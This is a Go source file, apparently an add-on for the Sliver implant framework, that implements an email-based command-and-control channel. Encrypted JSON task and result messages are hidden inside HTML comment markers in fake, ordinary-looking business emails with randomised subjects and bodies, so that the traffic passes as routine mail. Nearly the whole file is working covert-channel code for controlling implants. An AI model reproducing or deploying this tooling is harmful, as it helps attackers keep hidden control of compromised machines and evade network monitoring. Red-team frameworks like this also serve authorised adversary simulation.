package outlook

/*
	Sliver Implant Framework
	Copyright (C) 2024  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	mathrand "math/rand"
	"strings"
	"time"
)

// C2Message structure des messages C2
type C2Message struct {
	Type      string `json:"type"`       // "cmd" ou "result"
	TaskID    string `json:"task_id"`    // Identifiant unique de la tâche
	SessionID string `json:"session_id"` // ID de la session implant
	Payload   string `json:"payload"`    // Données en base64
	Timestamp int64  `json:"timestamp"`  // Pour éviter les replays
}

// EncodeMessage encode un message C2 pour l'envoyer par email
func EncodeMessage(msg *C2Message, encryptionKey []byte) (subject, body string, err error) {
	msg.Timestamp = time.Now().Unix()

	// Sérialiser en JSON
	jsonData, err := json.Marshal(msg)
	if err != nil {
		return "", "", fmt.Errorf("json marshal error: %w", err)
	}

	// Chiffrer avec AES-256-GCM
	encrypted, err := encryptAES(jsonData, encryptionKey)
	if err != nil {
		return "", "", fmt.Errorf("encryption error: %w", err)
	}

	// Encoder en base64
	encoded := base64.StdEncoding.EncodeToString(encrypted)

	// Générer un sujet d'email normal
	subject = generateFakeSubject()

	// Camoufler dans un corps d'email normal
	fakeBody := generateFakeEmailBody()
	body = fmt.Sprintf("%s\n\n<!--C2DATA-->\n%s\n<!--/C2DATA-->", fakeBody, encoded)

	return subject, body, nil
}

// DecodeMessage décode un message C2 depuis un email
func DecodeMessage(emailBody string, encryptionKey []byte) (*C2Message, error) {
	// Extraire la partie encodée entre <!--C2DATA--> et <!--/C2DATA-->
	start := strings.Index(emailBody, "<!--C2DATA-->")
	end := strings.Index(emailBody, "<!--/C2DATA-->")

	if start == -1 || end == -1 {
		return nil, errors.New("no encoded C2 data found in email")
	}

	// Extraire et nettoyer la partie encodée
	encoded := strings.TrimSpace(emailBody[start+13 : end])

	// Décoder base64
	encrypted, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, fmt.Errorf("base64 decode error: %w", err)
	}

	// Déchiffrer
	decrypted, err := decryptAES(encrypted, encryptionKey)
	if err != nil {
		return nil, fmt.Errorf("decryption error: %w", err)
	}

	// Parser JSON
	var msg C2Message
	err = json.Unmarshal(decrypted, &msg)
	if err != nil {
		return nil, fmt.Errorf("json unmarshal error: %w", err)
	}

	// Vérifier le timestamp (pas trop vieux, max 1h)
	age := time.Now().Unix() - msg.Timestamp
	if age > 3600 || age < -60 {
		return nil, fmt.Errorf("message timestamp out of acceptable range (age: %d seconds)", age)
	}

	return &msg, nil
}

// encryptAES chiffre avec AES-256-GCM
func encryptAES(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("aes cipher creation failed: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("gcm creation failed: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("nonce generation failed: %w", err)
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

// decryptAES déchiffre avec AES-256-GCM
func decryptAES(ciphertext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("aes cipher creation failed: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("gcm creation failed: %w", err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("decryption failed: %w", err)
	}

	return plaintext, nil
}

// generateFakeSubject génère un sujet d'email réaliste
func generateFakeSubject() string {
	subjects := []string{
		"RE: Project Update",
		"Meeting Notes - %s",
		"Quick Question",
		"FW: Document Review",
		"Weekly Report",
		"RE: Follow up",
		"Team Sync",
		"Action Items",
		"RE: Status Update",
		"FW: Information Request",
		"Discussion Points",
		"RE: Next Steps",
		"Calendar Invite",
		"RE: Proposal Review",
		"Summary Notes",
	}

	mathrand.Seed(time.Now().UnixNano())
	template := subjects[mathrand.Intn(len(subjects))]

	if strings.Contains(template, "%s") {
		dates := []string{
			time.Now().Format("01/02"),
			time.Now().Format("Jan 02"),
			"Q" + fmt.Sprintf("%d", (time.Now().Month()-1)/3+1),
		}
		return fmt.Sprintf(template, dates[mathrand.Intn(len(dates))])
	}

	return template
}

// generateFakeEmailBody génère un corps d'email réaliste
func generateFakeEmailBody() string {
	bodies := []string{
		"Hi,\n\nJust following up on our previous discussion. Let me know your thoughts when you get a chance.\n\nBest regards",
		"Hello,\n\nPlease review the attached information at your earliest convenience.\n\nThanks",
		"Hey,\n\nQuick update on the project status. Everything is progressing as planned.\n\nCheers",
		"Hi there,\n\nI wanted to touch base regarding the timeline we discussed. Can we sync up later this week?\n\nBest",
		"Hello,\n\nPer our conversation, here's the summary of action items. Let me know if you need any clarification.\n\nRegards",
		"Hi,\n\nHope you're doing well. I wanted to follow up on the items we discussed in our last meeting.\n\nThanks",
		"Hello,\n\nAttached are the notes from yesterday's discussion. Let me know if anything needs updating.\n\nBest",
		"Hey,\n\nJust a quick check-in on the progress. Everything looks good from my end.\n\nCheers",
		"Hi,\n\nSending over the information you requested. Let me know if you need anything else.\n\nRegards",
		"Hello,\n\nI've reviewed the materials and have a few questions. Can we schedule a quick call?\n\nThanks",
	}

	mathrand.Seed(time.Now().UnixNano())
	return bodies[mathrand.Intn(len(bodies))]
}
